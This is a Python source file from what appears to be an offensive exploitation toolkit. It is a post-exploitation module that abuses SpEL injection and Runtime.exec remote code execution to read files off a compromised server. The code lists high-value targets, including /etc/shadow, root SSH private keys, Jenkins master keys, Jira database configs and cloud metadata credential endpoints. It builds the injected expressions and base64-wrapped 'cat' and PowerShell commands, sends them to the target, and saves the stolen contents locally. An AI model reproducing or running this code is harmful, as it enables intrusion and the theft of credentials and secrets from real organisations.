# language: Python 3.10+, file: modules/post/file_read.py
# Post-exploitation: arbitrary file read on the target filesystem.
# Uses the confirmed RCE surface (Runtime.exec / SpEL) to read files
# and return their content via the HTTP response.

import base64
import json
import re
import urllib.request
import urllib.error
import ssl
from dataclasses import dataclass, field
from typing import Optional

from modules.fingerprint import FingerprintResult
from modules.exploit_core import ExploitCoreResult


# ─── High-value target files ──────────────────────────────────────────────────

DEFAULT_FILES = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/etc/hostname",
    "/proc/version",
    "/proc/net/tcp",
    "/root/.ssh/id_rsa",
    "/root/.ssh/authorized_keys",
    "/home/*/.ssh/id_rsa",
    "/etc/ssh/sshd_config",
    "/etc/environment",
    # Application config files
    "/opt/keycloak/conf/keycloak.conf",
    "/opt/atlassian/jira/conf/server.xml",
    "/var/atlassian/application-data/jira/dbconfig.xml",
    "/opt/atlassian/confluence/conf/server.xml",
    "${JENKINS_HOME}/secrets/master.key",
    "${JENKINS_HOME}/secrets/hudson.util.Secret",
    "/var/jenkins_home/secrets/master.key",
    "/app/application.properties",
    "/app/application.yml",
    "/config/application.properties",
    "/config/application.yml",
    "/etc/artifactory/artifactory.system.properties",
    # Cloud metadata
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",   # AWS IMDS
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",     # Azure IMDS
]

WINDOWS_FILES = [
    r"C:\Windows\System32\drivers\etc\hosts",
    r"C:\Users\Administrator\.ssh\id_rsa",
    r"C:\ProgramData\Jenkins\.jenkins\secrets\master.key",
    r"C:\Program Files\Atlassian\Application Data\JIRA\dbconfig.xml",
    r"C:\inetpub\wwwroot\web.config",
]


def _ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _spel_read_file(filepath: str) -> str:
    """SpEL expression to read a file and return its content as string."""
    b64_path = base64.b64encode(filepath.encode()).decode()
    return (
        f"new String(T(java.nio.file.Files).readAllBytes("
        f"T(java.nio.file.Paths).get("
        f"new String(T(java.util.Base64).getDecoder().decode(\"{b64_path}\")))))"
    )


def _cmd_read_file(filepath: str, windows: bool = False) -> str:
    """Shell command to cat/type a file, base64-encoded for safe transport."""
    if windows:
        return f"powershell -c \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('{filepath}'))\""
    else:
        return f"cat {filepath} | base64 -w 0"


def _send(target_url: str, path: str, body: bytes, headers: dict,
          timeout: float) -> tuple[int, str]:
    req = urllib.request.Request(
        target_url.rstrip("/") + path, data=body,
        headers={"User-Agent": "Java4Shell-FileRead/1.0", **headers},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()) as r:
            return r.status, r.read(65536).decode(errors="replace")
    except urllib.error.HTTPError as e:
        body_resp = ""
        try:
            body_resp = e.read(65536).decode(errors="replace")
        except Exception:
            pass
        return e.code, body_resp
    except Exception as e:
        return 0, str(e)


def _extract_content(response_body: str) -> Optional[str]:
    """Extract file content from an HTTP response."""
    # Try JSON fields that might contain the file content
    for field_name in ["output", "result", "data", "content", "text", "value", "message"]:
        m = re.search(rf'"{field_name}"\s*:\s*"([^"{{}}]{{10,}})"', response_body)
        if m:
            val = m.group(1)
            # Try to decode if Base64
            try:
                decoded = base64.b64decode(val + "==").decode(errors="replace")
                if len(decoded) > 10 and decoded.isprintable():
                    return decoded
            except Exception:
                pass
            return val

    # Try direct Base64 in response body
    for m in re.finditer(r"(?:^|[\s\"'])([A-Za-z0-9+/=]{40,})(?:[\s\"']|$)", response_body):
        try:
            decoded = base64.b64decode(m.group(1) + "==").decode(errors="replace")
            if len(decoded) > 20:
                return decoded
        except Exception:
            pass

    # Return raw response if it looks like file content
    if any(sig in response_body for sig in ["root:", "bin:", "daemon:", "-----BEGIN", "ssh-rsa", "[Unit]", "spring.", "jdbc:"]):
        return response_body[:8192]

    return None


# ─── Result ───────────────────────────────────────────────────────────────────

@dataclass
class FileReadResult:
    success: bool = False
    files_read: dict[str, str] = field(default_factory=dict)   # path → content
    files_failed: list[str] = field(default_factory=list)
    technique: str = ""
    error: Optional[str] = None
    notes: list[str] = field(default_factory=list)


# ─── Main function ────────────────────────────────────────────────────────────

def run_file_read(fp: FingerprintResult,
                  core: ExploitCoreResult,
                  files: Optional[list[str]] = None,
                  timeout: float = 15.0,
                  output_dir: Optional[str] = None,
                  verbose: bool = False) -> FileReadResult:
    """
    Read arbitrary files from the target filesystem.

    Args:
        fp:         Fingerprint result
        core:       Exploit core result (OOB write must be confirmed)
        files:      List of file paths to read (default: DEFAULT_FILES)
        timeout:    HTTP request timeout
        output_dir: Save read files to this directory
        verbose:    Print progress

    Returns FileReadResult with file contents.
    """
    result = FileReadResult()

    if not core.oob_triggered:
        result.error = "OOB write not confirmed — file read requires RCE."
        return result

    targets    = files or DEFAULT_FILES
    base       = fp.target_url.rstrip("/")
    endpoints  = sorted(fp.profile.endpoints, key=lambda e: e["priority"])
    primary    = endpoints[0]["path"] if endpoints else "/"

    # Detect Windows JVM
    is_windows = any(sig in str(fp.response_headers).lower() for sig in ["iis", "windows", "win64", "win32"])

    for filepath in targets:
        if verbose:
            print(f"  [filerd] Reading {filepath} …")

        # Try SpEL direct file read first
        spel_expr = _spel_read_file(filepath)
        body = json.dumps({"expression": spel_expr, "data": spel_expr}).encode()
        headers = {"Content-Type": "application/json"}

        content = None
        for endpoint in endpoints[:3]:
            code, resp = _send(base, endpoint["path"], body, headers, timeout)
            content = _extract_content(resp)
            if content:
                result.technique = f"SpEL NIO Files.readAllBytes via {endpoint['path']}"
                break

        # Fallback: command-based read
        if not content:
            cmd = _cmd_read_file(filepath, windows=is_windows)
            cmd_b64 = base64.b64encode(cmd.encode()).decode()
            exec_spel = (
                f"T(java.lang.Runtime).getRuntime().exec("
                f"new String[]{{\"bash\",\"-c\","
                f"new String(T(java.util.Base64).getDecoder().decode(\"{cmd_b64}\")))))"
            )
            body2 = json.dumps({"expression": exec_spel}).encode()
            for endpoint in endpoints[:3]:
                code2, resp2 = _send(base, endpoint["path"], body2, headers, timeout)
                content = _extract_content(resp2)
                if content:
                    result.technique = f"Runtime.exec cat|base64 via {endpoint['path']}"
                    break

        if content:
            result.files_read[filepath] = content
            result.success = True
            if verbose:
                print(f"  [filerd] ✓ {filepath}: {len(content)} chars")

            # Save to output dir if requested
            if output_dir:
                import os
                safe_name = filepath.replace("/", "_").replace("\\", "_").lstrip("_")
                out_path  = os.path.join(output_dir, safe_name)
                try:
                    os.makedirs(output_dir, exist_ok=True)
                    with open(out_path, "w", encoding="utf-8", errors="replace") as f:
                        f.write(content)
                except Exception as e:
                    result.notes.append(f"Could not save {filepath}: {e}")
        else:
            result.files_failed.append(filepath)
            if verbose:
                print(f"  [filerd] ✗ {filepath}: not readable")

    result.notes.append(
        f"Read {len(result.files_read)}/{len(targets)} files. "
        f"Technique: {result.technique or 'none confirmed'}"
    )

    return result
